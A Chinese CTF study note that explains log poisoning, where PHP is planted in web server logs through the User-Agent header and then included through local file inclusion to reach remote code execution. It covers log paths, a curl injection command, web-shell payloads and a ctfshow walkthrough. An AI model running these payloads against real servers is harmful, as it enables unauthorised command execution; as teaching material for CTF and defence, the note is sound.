# 日志投毒

日志投毒是文件包含题里很经典的一条利用链：当我们只能控制 `include()` / `require()` 的文件路径，但又暂时拿不到可直接执行的 PHP 文件时，可以先把 PHP 代码写进 Web 服务器日志，再通过 LFI 把日志文件包含进来，最终把“文件读取”升级成 “RCE”。

可以先配合阅读：[[fopen与include]]

---

## 利用前提

通常需要同时满足下面几条：

- 存在可控的文件包含点，例如 `include($_GET['file']);`
- 目标日志文件可读，可被包含
- 我们能控制会被写入日志的字段
- 日志内容里插入的 PHP 代码不会在写入过程中被过滤掉

最常见的可控字段有：

- `User-Agent`
- `Referer`
- 请求路径
- 某些反向代理追加的头

---

## 为什么能打成 RCE

核心不在“日志”本身，而在 `include()` 的执行语义。

如果服务端写日志时把下面这种内容原样记进了 `access.log`：

```php
<?php system($_GET['c']); ?>
```

那之后一旦存在：

```php
include('/var/log/nginx/access.log');
```

PHP 就不会把日志当纯文本读，而是会把其中的 `<?php ... ?>` 交给 Zend Engine 解析执行。

所以整条链其实是：

```text
可控请求头 -> 写入日志 -> LFI 包含日志 -> 执行日志中的 PHP -> 拿到命令执行
```

---

## 常见目标文件

Nginx:

```text
/var/log/nginx/access.log
/var/log/nginx/error.log
```

Apache:

```text
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/httpd/error_log
```

PHP-FPM / 其他：

- 某些题也会把可控内容打进应用自己的日志
- `error.log` 有时也能被动投毒，例如故意触发报错把可控内容带进去

---

## 标准利用步骤

### 1. 先确认 LFI 是否成立

例如：

```text
?file=/etc/passwd
```

如果能读到系统文件，说明包含点已经可控。

---

### 2. 探测日志路径是否可读

优先试：

```text
?file=/var/log/nginx/access.log
```

如果能看到访问记录，说明日志包含面已经成立。

---

### 3. 往日志里写 PHP 片段

最经典的是把 payload 放进 `User-Agent`：

```http
User-Agent: <?php system($_GET['c']); ?>
```

用 `curl` 发一发就够了：

```bash
curl -A "<?php system(\$_GET['c']);?>" http://target/
```

这一步的目标不是立刻回显，而是让服务端把这段 PHP 写进日志。

---

### 4. 再次包含日志，触发执行

```text
?file=/var/log/nginx/access.log&c=id
```

如果页面回显了 `uid=...`，就说明日志里的 PHP 已经被执行，RCE 成立。

---

## 这条链为什么在 CTF 里很常见

因为很多题会做这种“半吊子过滤”：

- 禁了 `php://`
- 禁了 `data://`
- 禁了 `:`
- 甚至会把 `php` 关键字替换掉

但它们只是在限制“你传什么路径”，并没有真正修掉：

```php
include($user_input);
```

只要站上还有一个我们能写进去的本地文件，LFI 依然能升级成代码执行。日志正好就是最稳定、最常见、最容易控制的落点。

---

## 典型 payload

最小验证：

```php
<?php phpinfo(); ?>
```

常用命令执行：

```php
<?php system($_GET['c']); ?>
```

更稳一点的写法：

```php
<?php echo shell_exec($_GET['c']); ?>
```

如果担心单双引号转义，也可以尽量缩短内容，优先测通执行面。

---

## 常见坑点

### 日志里不一定只有你的 payload

日志文件前面通常会有很多普通文本：

```text
172.0.0.1 - - [time] "GET / HTTP/1.1" 200 ...
```

这没关系。`include()` 遇到普通文本会直接输出，遇到 `<?php ... ?>` 才会执行。

---

### 不是所有日志都能直接打

有些环境：

- 日志不可读
- Web 用户无权访问日志
- 日志被切分到别的路径
- PHP 配置限制了错误显示和可访问路径

这时就得换思路，例如会话文件、上传临时文件、应用日志、`/proc/self/environ` 等其他可写落点。

---

### `error.log` 和 `access.log` 的打法不一样

- `access.log` 适合主动把 payload 塞进请求头或路径
- `error.log` 更适合故意触发报错，把可控内容带进错误日志

能先打 `access.log` 就先打，通常最直接。

## 这次 ctfshow 题的落地过程

题目首页直接给了源码：

```php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php","???",$file);
    $file = str_replace("data","???",$file);
    $file = str_replace(":","???",$file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

这说明：

- 有明显的 LFI
- `php://` / `data://` 这类 wrapper 被黑名单卡了
- 但本地绝对路径仍然能包含

利用过程就是：

1. `?file=/etc/passwd` 确认包含成立
2. `?file=/var/log/nginx/access.log` 确认 Nginx 日志可读
3. `User-Agent` 写入 `<?php system($_GET['c']);?>`
4. `?file=/var/log/nginx/access.log&c=id` 拿到命令执行
5. 继续在目标机里找 flag

这类题的关键，不是纠结黑名单怎么绕，而是先判断：

```text
既然 include 还在，站上有没有一个我能写进去的本地文件？
```

只要答案是“有”，日志投毒往往就是最短路径。
